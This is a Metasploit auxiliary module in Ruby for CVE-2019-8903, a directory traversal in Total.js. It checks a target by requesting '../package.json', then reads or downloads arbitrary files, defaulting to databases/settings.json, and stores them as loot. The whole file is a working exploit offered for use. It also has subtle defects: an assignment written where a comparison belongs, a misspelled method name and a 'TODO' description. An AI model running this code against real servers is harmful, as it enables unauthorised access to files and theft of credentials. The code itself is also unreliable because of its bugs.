##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Total.js directory traversal',
      'Description' => %q{
        TODO
      },
      'Author' =>
        [
          'Riccardo Krauter', # Discovery
          'Fabio Cogno'       # Metasploit module
        ],
      'License' => MSF_LICENSE,
      'References' => 
        [
          [ 'CVE', '2019-8903'],
          [ 'CWE', '22'],
          [ 'URL', 'https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/']
        ],
      'Targets' =>
        [
          ['3.1.0',
            {
              'trigger' => "../"
            }
          ]
        ],
      'Privileged' => false,
      'DisclosureDate' => 'Feb 18 2019',
      'Actions' =>
        [
          ['CHECK', {'Description' => 'Check if the target is vulnerable'}],
          ['READ', {'Description' => 'Attempt to print file content'}],
          ['DOWNLOAD', {'Description' => 'Attempt to downlaod a file'}]
        ],
      'DefaultAction' => 'CHECK'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path to Total.js App installation', '/']),
        OptString.new('FILE', [true, 'file to obtain', 'databases/settings.json'])
      ]
    )
  end

  def check()
    uri = target_uri.path + '../package.json'
    res = send_request_cgi(
    {
      'method' => 'GET',
      'uri' => uri
    })

    if res && res.code == 200
      print_good ("[#{target_host}] - Vulnerable!")
      json = res.get_json_document
      print_status ("\tTotal.js version is: #{json['dependencies']['total.js']}")
      print_status ("\tApp name: #{json['name']}")
      print_status ("\tApp description: #{json['description']}")
      print_status ("\tApp version: #{json['version']}")
    elsif res && res.code != 200
      print_error ("[#{target_host}] - Not vulnerable!")
    else
      print_error ("[#{target_host}] - Generic error")
    end      
  end

  def read()
    uri = target_uri.path + '../' + datastore['FILE']

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'version' => '1.1'
    })

    if res && res.code = 200
      print_good ("[#{target_host}] - Vulnerable!")
      print_status ("Getting file...")
      print_line(res.body)
      
    elsif res && res.code != 200
      print_error ("[#{target_host}] - #{res.code} HTTP response!")
    
    else
      print_error("[#{target_host}] - Generic error")
    end
  end

  def download()
    uri = target_uri.path + '../' + datastore['FILE']
    
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'version' => '1.1'
    })

    if res && res.code == 200
      fname = datastore['FILE'].split("/")[-1].chop
      loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
      print_good("File #{fname} downloaded to: #{loot}")
    elsif res && res.code != 200
      print_error ("[#{target_host}] - #{res.code} HTTP response!")
    else
      prin_error ("[#{target_host}] - Generic error")
    end      
  end

  def run_host(ip)
    if action.name == 'CHECK'
      check()

    elsif action.name == 'READ'
      read()

    elsif action.name == 'DOWNLOAD'
      download()
    end
  end
end